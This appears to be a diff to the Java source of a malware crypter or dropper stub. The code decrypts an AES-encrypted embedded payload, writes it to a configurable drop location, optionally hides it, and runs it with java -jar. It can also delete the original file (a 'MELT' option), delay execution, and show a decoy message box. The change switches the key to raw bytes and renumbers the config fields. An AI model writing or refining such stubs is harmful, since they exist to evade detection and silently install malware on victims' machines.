@@ -31,17 +31,24 @@ public class Main {
 			}
 
 			InputStream stubInput = Main.class.getResourceAsStream("/enc.dat");
-			String rawKeyFile = readString(Main.class.getResourceAsStream("/key.dat"));
+			InputStream keyInput = Main.class.getResourceAsStream("/key.dat");
+			
+			byte[] encryptionKey = new byte[16];
+			
+			for (int i = 0; i < encryptionKey.length; i++) {
+				encryptionKey[i] = (byte) keyInput.read();
+			}
+			
+			String rawKeyFile = readString(keyInput);
 
 			String[] keyArgs = rawKeyFile.split(",");
-			String encryptionKey = decode(keyArgs[0].trim());
-			String dropLocation = decode(keyArgs[1].trim());
-			String dropFileName = decode(keyArgs[2].trim());
+			String dropLocation = decode(keyArgs[0].trim());
+			String dropFileName = decode(keyArgs[1].trim());
 
-			boolean hidden = Boolean.parseBoolean(decode(keyArgs[10].trim()));
+			boolean hidden = Boolean.parseBoolean(decode(keyArgs[9].trim()));
 
-			if (decode(keyArgs[8]).equalsIgnoreCase("true")) {
-				Thread.sleep(Long.parseLong(keyArgs[9]));
+			if (decode(keyArgs[7]).equalsIgnoreCase("true")) {
+				Thread.sleep(Long.parseLong(keyArgs[8]));
 			}
 
 			if (System.getProperty("os.name").toLowerCase().contains("win") && Main.class.getResourceAsStream("/host.dat") != null) {
@@ -96,7 +103,7 @@ public class Main {
 			FileOutputStream out = new FileOutputStream(file);
 			Cipher dcipher = Cipher.getInstance("AES");
 
-			Key keySpec = new SecretKeySpec(encryptionKey.getBytes("UTF-8"), "AES");
+			Key keySpec = new SecretKeySpec(encryptionKey, "AES");
 			dcipher.init(Cipher.DECRYPT_MODE, keySpec);
 			stubInput = new CipherInputStream(stubInput, dcipher);
 			int numRead = 0;
@@ -161,27 +168,27 @@ public class Main {
 			}
 
 			if (System.getProperty("os.name").toLowerCase().contains("win")) {
-				if (Boolean.parseBoolean(decode(keyArgs[3].trim()))) {
+				if (Boolean.parseBoolean(decode(keyArgs[2].trim()))) {
 					String mepath = Main.class.getProtectionDomain().getCodeSource().getLocation().getPath();
 					Runtime.getRuntime().exec(new String[] { javapath, "-jar", file.getAbsolutePath(), "MELT", mepath });
 				} else {
 					Runtime.getRuntime().exec(new String[] { javapath, "-jar", file.getAbsolutePath() });
 				}
 			} else {
-				if (Boolean.parseBoolean(decode(keyArgs[3].trim()))) {
+				if (Boolean.parseBoolean(decode(keyArgs[2].trim()))) {
 					String mepath = Main.class.getProtectionDomain().getCodeSource().getLocation().getPath();
 					Runtime.getRuntime().exec(new String[] { "java", "-jar", file.getAbsolutePath(), "MELT", mepath });
 				} else {
 					Runtime.getRuntime().exec(new String[] { "java", "-jar", file.getAbsolutePath().replace("file:", "").replace(" ", "%20") });
 				}
 			}
-			if (decode(keyArgs[4]).equalsIgnoreCase("true")) {
+			if (decode(keyArgs[3]).equalsIgnoreCase("true")) {
 				try {
 					UIManager.setLookAndFeel(UIManager.getSystemLookAndFeelClassName());
 				} catch (Exception e1) {
 					e1.printStackTrace();
 				}
-				JOptionPane.showMessageDialog(null, decode(keyArgs[5]), decode(keyArgs[6]), Integer.parseInt(keyArgs[7]));
+				JOptionPane.showMessageDialog(null, decode(keyArgs[4]), decode(keyArgs[5]), Integer.parseInt(keyArgs[6]));
 			}
 		} catch (Exception e) {
 			e.printStackTrace();
